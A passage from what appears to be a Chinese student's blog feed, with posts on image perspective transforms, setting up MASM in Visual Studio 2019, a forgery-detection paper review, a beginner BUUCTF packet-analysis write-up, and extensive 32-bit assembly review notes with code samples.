class="number">375</span>,<span class="number">500</span>,<span class="number">3</span>]) <span class="comment">#高，宽，通道</span></span><br><span class="line"> </span><br><span class="line">src_points = np.array([[<span class="number">165.</span>, <span class="number">270.</span>], [<span class="number">400.</span>, <span class="number">270.</span>], [<span class="number">360.</span>, <span class="number">125.</span>], [<span class="number">400.</span>, <span class="number">125.</span>]], dtype=<span class="string">&quot;float32&quot;</span>)</span><br><span class="line">dst_points = np.array([[<span class="number">165.</span>, <span class="number">270.</span>], [<span class="number">400.</span>, <span class="number">270.</span>], [<span class="number">165.</span>, <span class="number">30.</span>], [<span class="number">400.</span>, <span class="number">30.</span>]], dtype=<span class="string">&quot;float32&quot;</span>)</span><br><span class="line"> </span><br><span class="line">M = cv2.getPerspectiveTransform(src_points, dst_points)</span><br><span class="line">T = M.reshape(<span class="number">1</span>,-<span class="number">1</span>).squeeze().tolist()</span><br><span class="line">T = T[:-<span class="number">1</span>]</span><br><span class="line"><span class="comment">#创建操作</span></span><br><span class="line">trans_op=tf.contrib.image.transform(<span class="built_in">input</span>, T)</span><br><span class="line"><span class="comment">#执行操作</span></span><br><span class="line"><span class="keyword">with</span> tf.Session() <span class="keyword">as</span> sess:</span><br><span class="line">    trans_img=sess.run(trans_op,feed_dict=&#123;<span class="built_in">input</span>:img&#125;)</span><br><span class="line">    cv2.imshow(<span class="string">&#x27;img&#x27;</span>,trans_img)</span><br><span class="line">cv2.waitKey()</span><br><span class="line">cv2.destroyAllWindows()</span><br></pre></td></tr></table></figure><h2 id="kornia"><a href="#kornia" class="headerlink" title="kornia"></a>kornia</h2><p>这个据说是一个高阶的API,可以可微得进行数据扩展，warp是其中之一，没有试过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> kornia.geometry <span class="keyword">import</span> get_perspective_transform, warp_perspective</span><br></pre></td></tr></table></figure><blockquote><h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p>仿射变换博客：<a href="https://www.jianshu.com/p/723af68beb2e">https://www.jianshu.com/p/723af68beb2e</a></p><p>STN博客：<a href="https://blog.csdn.net/qq_39422642/article/details/78870629">https://blog.csdn.net/qq_39422642/article/details/78870629</a></p><p>STN网络教程：<a href="https://pytorch.org/tutorials/intermediate/spatial_transformer_tutorial.html">https://pytorch.org/tutorials/intermediate/spatial_transformer_tutorial.html</a></p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Sat Oct 24 2020 00:00:00 GMT+0800 (中国标准时间)</title>
      <link href="/2020/05/27/%E5%8E%9F%E5%88%9B--%20%202020-10-24/"/>
      <url>/2020/05/27/%E5%8E%9F%E5%88%9B--%20%202020-10-24/</url>
      
        <content type="html"><![CDATA[<h1 id="原创"><a href="#原创" class="headerlink" title="原创"></a>原创</h1><p>：  2020-10-24</p><h1 id="2020-10-24"><a href="#2020-10-24" class="headerlink" title="2020-10-24"></a>2020-10-24</h1><p>最近新学习了汇编语言，在vs2019上配置汇编的环境花了很长的事件，总结一下我经过最近的悲惨经历之后的成果。</p><p> </p><p>1，作为学习者，如果需要使用debug功能，最好是不要使用masmplus，因为它的自定义组件debug.exe在64位的windows系统上是不兼容的。debug.exe这个东西可能在几年前还是win的系统上自带的，但是现在而言，至少我的电脑上是没有的，如果在网上去找，还是可以找到的，但是还是没有什么用，因为不兼容呀。推荐还是使用vs2019，再装个插件。插件可以使用AsmDude，可以提供局部高亮。</p><p> </p><h1 id="2，如果以上的环境搭建还是无法让汇编启动，那么就需要-”INCLUDE-Irvine32-inc“-这个东西了。"><a href="#2，如果以上的环境搭建还是无法让汇编启动，那么就需要-”INCLUDE-Irvine32-inc“-这个东西了。" class="headerlink" title="2，如果以上的环境搭建还是无法让汇编启动，那么就需要**”INCLUDE Irvine32.inc“**这个东西了。"></a>2，如果以上的环境搭建还是无法让汇编启动，那么就需要**<u><strong>”INCLUDE Irvine32.inc“</strong></u>**这个东西了。</h1><p>这个Irvine的库非常的重要</p><p><a href="https://www.lanzous.com/i6364hg">https://www.lanzous.com/i6364hg</a></p><p>还是像配置上面的环境一样把这里的库配到vs2019的项目属性里面就可以了。</p><p> </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>A Comparative Study on the Detection of Image Forgery of Tampered Background or Foreground</title>
      <link href="/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20A%20Comparative%20Study%20on%20the%20Detection%20of%20Image%20Forgery%20of%20Tampered%20Background%20or%20Foreground/"/>
      <url>/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20A%20Comparative%20Study%20on%20the%20Detection%20of%20Image%20Forgery%20of%20Tampered%20Background%20or%20Foreground/</url>
      
        <content type="html"><![CDATA[<h1 id="原创"><a href="#原创" class="headerlink" title="原创"></a>原创</h1><p>：  A Comparative Study on the Detection of Image Forgery of Tampered Background or Foreground</p><h1 id="A-Comparative-Study-on-the-Detection-of-Image-Forgery-of-Tampered-Background-or-Foreground"><a href="#A-Comparative-Study-on-the-Detection-of-Image-Forgery-of-Tampered-Background-or-Foreground" class="headerlink" title="A Comparative Study on the Detection of Image Forgery of Tampered Background or Foreground"></a>A Comparative Study on the Detection of Image Forgery of Tampered Background or Foreground</h1><blockquote></blockquote><p>A Comparative Study on the Detection of Image Forgery of Tampered<br> Background or Foreground</p><blockquote></blockquote><p>2021 9th International Symposium on Digital Forensics and Security<br> (ISDFS) | 978-1-6654-4481-1&#x2F;21&#x2F;$31.00 ©2021 IEEE | DOI:<br> 10.1109&#x2F;ISDFS52919.2021.9486363</p><p>对于图像前景&#x2F;背景伪造的研究。这篇论文是数据集的论文。作者还是很有见地的，就是做的数据集不咋地。<br> 就是splicing。<br> 背景替换，就是splicing的一部分。但是，预先就设定了前提<br> 区分了前景伪造和背景伪造。</p><h2 id="前景伪造和背景伪造"><a href="#前景伪造和背景伪造" class="headerlink" title="前景伪造和背景伪造"></a>前景伪造和背景伪造</h2><p>就<strong>图像的像素表示</strong>而言是同样的东西。<br> 但是对于<strong>图像的其他特征</strong>而言，是不一样的。<br> 因为图像不止有人眼看到的像素信息。这两者还是有一些差别的。</p><p>话说这个数据集做的是真的假。做伪造数据集至少语义上要合理吧！！<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/1e2015f741694b6c9b0dcd5badc5f217.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"></p>]]></content>
      
      
      <categories>
          
          <category> 篡改检测 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> deeplearning </tag>
            
            <tag> cv </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021-3-21 数据包中的线索BUUCTF</title>
      <link href="/2020/05/27/%E5%8E%9F%E5%88%9B--%20%202021-3-21%20%E6%95%B0%E6%8D%AE%E5%8C%85%E4%B8%AD%E7%9A%84%E7%BA%BF%E7%B4%A2BUUCTF/"/>
      <url>/2020/05/27/%E5%8E%9F%E5%88%9B--%20%202021-3-21%20%E6%95%B0%E6%8D%AE%E5%8C%85%E4%B8%AD%E7%9A%84%E7%BA%BF%E7%B4%A2BUUCTF/</url>
      
        <content type="html"><![CDATA[<h1 id="原创"><a href="#原创" class="headerlink" title="原创"></a>原创</h1><p>：  2021&#x2F;3&#x2F;21 数据包中的线索BUUCTF</p><h1 id="2021-x2F-3-x2F-21-数据包中的线索BUUCTF"><a href="#2021-x2F-3-x2F-21-数据包中的线索BUUCTF" class="headerlink" title="2021&#x2F;3&#x2F;21 数据包中的线索BUUCTF"></a>2021&#x2F;3&#x2F;21 数据包中的线索BUUCTF</h1><blockquote></blockquote><p><a href="https://buuoj.cn/challenges#%E6%95%B0%E6%8D%AE%E5%8C%85%E4%B8%AD%E7%9A%84%E7%BA%BF%E7%B4%A2">https://buuoj.cn/challenges#%E6%95%B0%E6%8D%AE%E5%8C%85%E4%B8%AD%E7%9A%84%E7%BA%BF%E7%B4%A2</a><br> <img alt="题目描述" src="https://img-blog.csdnimg.cn/20210321124427252.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70">题目描述如上</p><p><img alt="我们拿到的文件" src="https://img-blog.csdnimg.cn/20210321124533463.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> 我们拿到了一个流量包</p><p>老办法：先搜索一下字符串flag,发现找不到（万事休矣—–）</p><p>不知道为什么需要追踪http 流,那么发现找到的包里面很可能是base64编码。<br> <img alt="base64" src="https://img-blog.csdnimg.cn/20210321125022492.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> <a href="https://the-x.cn/base64">https://the-x.cn/base64</a></p><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210321125259221.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> 下载文件，即可得到flag</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 本科生 </tag>
            
            <tag> 竞赛，ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>32位汇编语言复习文档</title>
      <link href="/2020/05/27/%E5%8E%9F%E5%88%9B--%20%2032%E4%BD%8D%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%A4%8D%E4%B9%A0%E6%96%87%E6%A1%A3/"/>
      <url>/2020/05/27/%E5%8E%9F%E5%88%9B--%20%2032%E4%BD%8D%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%A4%8D%E4%B9%A0%E6%96%87%E6%A1%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="原创"><a href="#原创" class="headerlink" title="原创"></a>原创</h1><p>：  32位汇编语言复习文档</p><h1 id="32位汇编语言复习文档"><a href="#32位汇编语言复习文档" class="headerlink" title="32位汇编语言复习文档"></a>32位汇编语言复习文档</h1><p>汇编使用C语言的参数<br> printf的参数从右向左push，最后再 call crt_printf 和 call crt_scanf;<br> 调用伪指令 CALL</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">.686</span><br><span class="line">.model flat, stdcall</span><br><span class="line">.stack 4096</span><br><span class="line">INCLUDE Irvine32.inc</span><br><span class="line">INCLUDELIB Irvine32.lib</span><br><span class="line">include F:\masm32\include\msvcrt.inc</span><br><span class="line">includelib F:\masm32\lib\msvcrt.lib</span><br><span class="line">.data</span><br><span class="line">me_str db &#x27;hello world! %x\n&#x27;,0</span><br><span class="line">me_input_int db &#x27;%d&#x27;</span><br><span class="line">int32_val dd 123</span><br><span class="line">ExitProcess proto,dwExitCode:dword </span><br><span class="line">.code </span><br><span class="line">main proc</span><br><span class="line">push offset int32_val</span><br><span class="line">push offset me_input_int</span><br><span class="line">call crt_scanf;</span><br><span class="line">push int32_val</span><br><span class="line">push offset me_str</span><br><span class="line">call crt_printf</span><br><span class="line">invoke ExitProcess,0</span><br><span class="line">main endp </span><br><span class="line">end main</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>CF是无符号数溢出标志，OF是有符号数溢出标志</p><p>db定义字节类型变量，一个字节数据占1个字节单元，读完一个，偏移量加1 AL 8位<br> Define byte</p><p>dw定义字类型变量，一个字数据占2个字节单元，读完一个，偏移量加2 AX 16位<br> Define word</p><p>dd定义双字类型变量，一个双字数据占4个字节单元，读完一个，偏移量加4 EAX 32位 define dword</p><p>Dq 存放64位的双精度数据 8个字节 一般使用FPU寄存器来计算，但是也可以使用强制类型转换赋值给通用寄存器</p><p>使用<br> DD 最多存放2个WORD,4个字符 ,也就是Dword的大小,DD就是DWORD ,DOUBLE WORD<br> 是伪指令的写法<br> 两个字符为一个byte，<br> 2个字节为DWORD，<br> 也就是32位，4个BYTE</p><p>int32_val2 dd ‘1234’<br> 定义dd ，目标内存为 倒序<br> int32_val2 dd ‘12345’ 报错，定义的字符串过大，超出32位的存放大小</p><p>0X 39 30<br> 57 48<br> 57&#x3D;3<strong>16+9<br> 48&#x3D;3</strong>16</p><p>0X 3039 &#x3D;3<strong>16<sup>3+9*16</sup>2+3</strong>16 &#x3D; 12345</p><p>通过小端对齐，把高字节的39放在内存高位，所以为</p><p>39 30</p><p>理论上，DD 类型的数据可以存放为2^32次方的数据</p><p>DW 16位 2个字节 1个WORD 初始值可能为 00 00 首先存放在低字节处，好歹大小也可以有2^16</p><p>0x:d2 4d <br> D:19922</p><p>实际存储为4DD2 还是小段对齐，优先放在低位 ，在存放到高位 的内存</p><p>12*16+7&#x3D;199</p><p>7*16+11&#x3D;123</p><p>00C7</p><p>007B</p><p>7B(0X) &#x3D;7*16+11&#x3D;123</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MOV AH,7B</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>EAX:00EA 7B 01</p><p>AX AH AL</p><p>MOV AL ,7B</p><p>移动到AL 寄存器的位置</p><p>9*16+1&#x3D;145</p><p>255+22 &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;15 CF&#x3D;1 OF&#x3D;0<br> CF表示无符号数 ，OF表示有符号数<br> 由此，若将两数字看作有符号数，则没有溢出，以往255为1111 1111 它的补码是-1，表示-1 ；22为 0000 0016 表示22本身。所以，正数和负数相加，结果为正数，不可能溢出<br> 若，将两数字看作无符号数字，则溢出，因为BYTE的界限是255，明显就是溢出了</p><p>16进制储存数组元素</p><p>在DWORD PTR 后 ，类型被强制转换后，默认存放；若是WORD PTR 的转换，则存放到AX中，此时，可以使用位运算的操作，将其他的位置零。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MOV ecx,10</span><br><span class="line">L5:dec int32_val</span><br><span class="line">LOOP L5</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>LOOP指令很容易出现错误，需要在使用前确定，尽量少使用MOV CX,10 之类的形式， 或是应该先将ECX 置零 XOR ECX,ECX 比较好。</p><p>FFFF FF FF 不能使用<br> 应该使用0FFFFFFFFH<br> 0和H 都是必须要有的，涉及到汇编识别16进制数字的规范</p><p>在16进制数，的开头是1的情况下(也就是说，在A-F开头的情况下在16进制前添加0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.DATA</span><br><span class="line">stridword  31h,2,3,4,5,6,37h,8,9,0AH,0BH,0CH,0DH,0EH,0FH,0FFH</span><br><span class="line">count=lengthof stri</span><br><span class="line">.CODE</span><br><span class="line">main proc</span><br><span class="line">MOV ECX,count</span><br><span class="line">dec ecx</span><br><span class="line">outlp:mov edx,ecx</span><br><span class="line">mov ebx,offset stri</span><br><span class="line">inlp:mov eax,[ebx]</span><br><span class="line">cmp eax,[ebx+4]</span><br><span class="line">jng next</span><br><span class="line">xchg eax,[ebx+4]</span><br><span class="line">mov [ebx],eax</span><br><span class="line"></span><br><span class="line">next:add ebx,4</span><br><span class="line">dec edx </span><br><span class="line">jnz inlp</span><br><span class="line">loop outlp</span><br><span class="line">main endp</span><br><span class="line">end main</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>冒泡排序结构，edx控制内循环，ecx控制外循环，dword 4个字节，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Mov ecx,count</span><br><span class="line">Dec ecx</span><br><span class="line">Outlp: mov edx,ecx</span><br><span class="line">Mov ebx,offset stri</span><br><span class="line">Inlp:MOV EAX,[EBX]</span><br><span class="line">CMP EAX,[EBX+4]</span><br><span class="line">JNG NEST </span><br><span class="line">XCHG eax,[ebx+4]</span><br><span class="line">MOv [ebx],eax </span><br><span class="line">Netx:add ebx,4</span><br><span class="line">Dec edx</span><br><span class="line">Jnz inlp</span><br><span class="line">Loop outlp</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>对应的C语言形式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">For(i): [  OUTLLP  ]</span><br><span class="line">For(j):[ INLP ]</span><br><span class="line">If (x[]&amp;gt;x[]):</span><br><span class="line">Echg:</span><br><span class="line">[NEXT]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Dword 占4个字节 32位 00 00 00 00 置零的情况， 31h （31 00 00 00）</p><p>mov eax,31323334h 极限是32位</p><p>地址大小为8位的16进制 ，32位2进制</p><p>这是将’A’传递到EAX寄存器，A必须带’’否则会解释为A名称的数组。<br> ‘A’表示 十进制的65，既是16进制的41h。等价</p><p>1234和’1234’是不一样的，在内存中的存储<br> ‘1234’表示字符串，也可以表示31323334h的16进制数字。<br> ‘1234’在内存中实际上是34333231的存储<br> 还有 1,2,3,4 和’1’,’2’,’3’,’4’是不一样的。这两个表示dd数组，每个占32位，是01000000,02000000,03000000,04000000;和31000000,32000000,33000000,34000000<br> 很有意思</p><p>1234表示1234d 的10进制，16进制为4D2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.if x &amp;lt; 0</span><br><span class="line">mov eax,-1</span><br><span class="line">mov y,eax</span><br><span class="line">.elseif x &amp;gt;  0</span><br><span class="line">mov  eax,1</span><br><span class="line">mov y,eax</span><br><span class="line">.else</span><br><span class="line">mov eax,0</span><br><span class="line">mov y,eax</span><br><span class="line">.endif</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>汇编If结构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.if </span><br><span class="line"></span><br><span class="line">.elseif </span><br><span class="line"></span><br><span class="line">.else</span><br><span class="line"></span><br><span class="line">.endif</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>DWORD类型数组，每个元素占4个字节<br> 这个和连起来是不一样的</p><p>esi 的取值到最后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.WHILE   esi&amp;lt;count*4+offset stri</span><br><span class="line">cmp byte ptr [esi],20h</span><br><span class="line">je next</span><br><span class="line">mov ebx,[esi]</span><br><span class="line">mov [edi],ebx</span><br><span class="line">mov eax,[edi]</span><br><span class="line">mov eax ,sizeof(dword)  </span><br><span class="line">#sizeof(dword)=4;sizeof(word)=2;sizeof(byte)=1 </span><br><span class="line">add edi,eax</span><br><span class="line">next:</span><br><span class="line">mov eax ,sizeof(dword)</span><br><span class="line">add esi,eax</span><br><span class="line">.ENDW</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>遇到空格，则跳到NEXT 位置；若不是空格，则把[esi]的数值传送到[edi]。</p><p>While 循环语句<br> .while 持续条件</p><p>.endw</p><p>汇编表示16进制必须加后缀 H</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.DATA</span><br><span class="line">stribyte  31h,2,3,4,5,6,37h,8,9,0AH,0BH,0CH,0DH,0EH,0FH</span><br><span class="line">strjdb 4 dup(&#x27;123&#x27;,&#x27; &#x27;,&#x27;abc&#x27;)</span><br><span class="line">disbyte sizeof stri dup(?)  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>#一般而言，是要除以定义类型的大小的，但是此处是byte，单位byte的大小是1。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.CODE</span><br><span class="line">main proc </span><br><span class="line">mov eax,offset strj此时eax指向了strj的首地址</span><br><span class="line">mov esi,offset stri </span><br><span class="line">mov edi ,offset dis</span><br><span class="line">add esi ,lengthof stri-1此时指向的是strj的最后一个元素的位置</span><br><span class="line">add edi ,lengthof dis-1</span><br><span class="line">mov ecx,lengthof stri</span><br><span class="line">std</span><br><span class="line">rep movsb</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main endp</span><br><span class="line">end main</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>· db 4 dup(‘123’,‘abc’) #可以重复4个’123abc’，<br> Str db n dup(‘string’)可以在str作为首位置中重复 n个string</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Std     </span><br><span class="line">rep movsb</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>cld，清方向标志，即(DF)&#x3D;0,地址从低到高<br> std，置方向标志1，DF&#x3D;1，地址从高到低，<br> 也就是从数组的末尾到数组的头的方向</p><p>Rep 串指令<br> movsb指令用于把字节从ds:si 搬到es:di；<br> rep是repeat的意思，rep movsb 就是多次搬运。<br> 搬运前先把字符串的长度存在cx寄存器中，<br> 然后重复的次数就是cx寄存器所存数据的值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">.386</span><br><span class="line">.model flat,stdcall</span><br><span class="line">.stack 4096</span><br><span class="line">INCLUDE Irvine32.inc</span><br><span class="line">INCLUDELIB Irvine32.lib</span><br><span class="line">include F:\masm32\include\msvcrt.inc</span><br><span class="line">includelib F:\masm32\lib\msvcrt.lib</span><br><span class="line"></span><br><span class="line">.DATA</span><br><span class="line">x byte 8,1,8,1,8,1,16,8,3,2,1,1,1,1</span><br><span class="line">n  =lengthof x </span><br><span class="line">count dword 0</span><br><span class="line">.CODE</span><br><span class="line">main proc </span><br><span class="line">xor ebx, ebx</span><br><span class="line">xor eax, eax</span><br><span class="line">xor ecx, ecx</span><br><span class="line">mov esi,offset x</span><br><span class="line">mov ecx, n-1</span><br><span class="line">mov ebx,n-1</span><br><span class="line">add esi,ebx</span><br><span class="line">lp:</span><br><span class="line">mov ax,[esi]</span><br><span class="line">and ax,0fh</span><br><span class="line">mov bl,4</span><br><span class="line">dec esi</span><br><span class="line">DIV bl</span><br><span class="line">CMP AH, 0</span><br><span class="line">JNE next</span><br><span class="line">add count, 1</span><br><span class="line">next:</span><br><span class="line">mov eax,count</span><br><span class="line">cmp esi,offset x-1</span><br><span class="line">je  break</span><br><span class="line">loop lp</span><br><span class="line">break:</span><br><span class="line">mov eax,count</span><br><span class="line">main endp</span><br><span class="line">end main</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>判定整除4 的数量</strong></p><p>将整除2的数字转储</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">.DATA</span><br><span class="line"></span><br><span class="line">BUF Db 12H, 32H, 0BH, 1, 3, 90, 33H, 128, 2, 9</span><br><span class="line">EDATA Db 10 DUP(0)</span><br><span class="line"></span><br><span class="line">.CODE</span><br><span class="line">main proc</span><br><span class="line">LEA ESI,BUF</span><br><span class="line">MOV ECX,10 </span><br><span class="line">lea di,EDATA</span><br><span class="line">NEXT:</span><br><span class="line">LODSB</span><br><span class="line">#存放[ESI]的一个字节到AL中，（根据DF=1或0来判断，若为0，自增1；若为1，自减1）并ESI+1</span><br><span class="line">SHR AL, 1</span><br><span class="line">SHL AL, 1</span><br><span class="line">mov ebx,[esi-1]</span><br><span class="line">CMP AL,byte ptr [ESI-1]  </span><br><span class="line">JnZ ODDDATA</span><br><span class="line">STOSB</span><br><span class="line"></span><br><span class="line">ODDDATA:LOOP NEXT</span><br><span class="line"></span><br><span class="line">invoke ExitProcess,0</span><br><span class="line">main endp</span><br><span class="line">end main</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>处理字符串数组时候比较有用，是一连串指令的简易表示<br> 把esi位置的内存数据<br> Lodsb 存放byte 到ah<br> Lodsw 存放word 到ax<br> Lodsd 存放dword 到eax</p><p>LODSB,LODSW,LODSD把esi的内存数据存放到ah,ax,eax<br> 与之对应的是stosb,stosw,stosd; 一般需要一同使用<br> 意为把ah,ax,eax 存放到edi</p><p>使用FPU堆栈寄存器，堆栈溢出的表示。</p><blockquote></blockquote><p>1#IND</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lea eax,[1+5*56]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>汇编邪道流计算四则运算的方法</strong><br> <img alt="程序截图" src="https://img-blog.csdnimg.cn/20210119114752391.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70#pic_center"></p><p>计算得出的数字是16进制，可以很容易的使用，而不必使用寄存器来运算</p>]]></content>
      
      
      <categories>
          
          <category> 汇编，信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 本科生 </tag>
            
            <tag> 复习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>A Deep Learning based Method for Image Splicing Detection</title>
